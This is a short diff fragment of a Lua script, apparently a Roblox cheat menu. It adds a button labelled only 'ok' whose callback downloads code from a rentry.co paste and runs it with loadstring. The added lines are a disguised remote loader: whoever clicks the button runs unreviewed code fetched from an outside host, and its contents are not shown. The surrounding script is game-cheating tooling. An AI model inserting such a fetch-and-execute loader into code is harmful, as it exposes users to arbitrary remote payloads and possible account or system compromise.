@@ -6481,6 +6481,17 @@ spawn(function()
  end
  end)
 
+Tabs.Ok:AddButton({
+	Title = "ok", 
+	Description = "",
+	Callback = function()
+        loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
+
+	
+    end
+})
+
+
 
 Tabs.Main:AddButton({
 	Title = "Auto cdk", 
